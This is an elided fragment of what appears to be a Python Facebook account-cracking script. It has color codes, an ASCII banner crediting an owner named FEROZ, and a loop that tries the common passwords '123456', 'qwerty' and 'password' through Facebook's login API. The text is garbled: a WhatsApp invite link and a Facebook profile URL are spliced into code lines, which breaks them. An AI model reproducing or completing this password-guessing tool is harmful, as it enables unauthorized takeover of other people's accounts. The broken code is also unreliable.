...
#-----------------------------[COLOR CODE]-----------------------------------#
r = "\x1b[1;31m"
g = "\x1b[1;32m"https://chat.whatsapp.com/IZPR1tNPgq6BL3p5ZOGca9?mode=ems_copy_t
b = "\x1b[1;34m"
p = "\x1b[1;35m"
m = "\x1b[1;36m"
w = "\x1b[1;37m"
...
#----------------------------[LOGO]-----------------------------------#
logo = f"""{g}
d88888b d88888b d8888b.  .d88b.  d88888D 
88'     88'     88  `8D .8P  Y8. YP  d8' 
88ooo   88ooooo 88oobY' 88    88    d8'  
88~~~   88~~~~~ 88`8b   88    88   d8'   
88      88.     88 `88. `8b  d8'  d8' db 
YP      Y88888P 88   YD  `Y88P'  d88888P 
{p}━═━═══━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━━══━═━═━═━═━══{w}
TOOL OWNER    {r}:{w} FEROZ
    ...
    try:
        ...
        for pw in ('123456', '1234567', 'qwerty', 'password'):
            data = {
                ...
                'fb_api_caller_class': 'com.facebook.account.login.protocol https://www.facebook.com/profile.php?id=61565485674336',
